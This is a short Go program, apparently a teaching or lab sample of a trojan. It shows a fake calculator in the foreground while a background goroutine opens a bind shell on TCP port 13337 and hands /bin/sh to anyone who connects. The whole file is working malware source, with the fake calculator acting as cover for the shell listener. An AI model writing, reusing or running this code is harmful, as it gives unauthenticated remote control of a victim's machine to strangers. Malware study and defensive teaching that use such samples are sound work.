package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func fakePayload() {
	var op1, op2 int
	var oper string
	fmt.Println("Welcome to Fake Powerful Calc!")

	for {
		fmt.Println("Operand 1: ")
		fmt.Scan(&op1)
		fmt.Println("Operand 2: ")
		fmt.Scan(&op2)
		fmt.Println("Operation (+,-,*,/): ")
		fmt.Scan(&oper)

		switch oper {
		case "+":
			fmt.Println(op1 + op2)
		case "-":
			fmt.Println(op1 - op2)
		case "*":
			fmt.Println(op1 * op2)
		case "/":
			fmt.Println(op1 / op2)
		}
	}
}

func BindShellHandle(conn net.Conn) {
	cmd := exec.Command("/bin/sh")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func bindShellPayload() {
	listener, err := net.Listen("tcp", ":13337")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go BindShellHandle(conn)
	}
}

func main() {
	go bindShellPayload()
	fakePayload()
}
